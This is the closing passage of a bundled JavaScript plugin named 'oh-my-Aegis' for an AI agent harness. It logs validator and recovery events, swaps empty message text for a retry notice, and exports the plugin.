            safeNoteWrite("thinking-block-validator", () => {
              notesStore.recordScan(`Thinking block validator applied: session=${input.sessionID} message=${input.messageID}`);
            });
          }
        }
        if (!config3.recovery.enabled || !config3.recovery.empty_message_sanitizer) {
          return;
        }
        if (output.text.trim().length > 0) {
          return;
        }
        output.text = "[oh-my-Aegis recovery] Empty message recovered. Please retry the last step.";
        safeNoteWrite("recovery.empty", () => {
          notesStore.recordScan(`Empty message sanitized: session=${input.sessionID} message=${input.messageID} part=${input.partID}`);
        });
      } catch (error92) {
        noteHookError("text.complete", error92);
      }
    }
  };
};
var index_core_default = OhMyAegisPlugin;

// src/index.ts
var src_default = index_core_default;
export {
  src_default as default
};
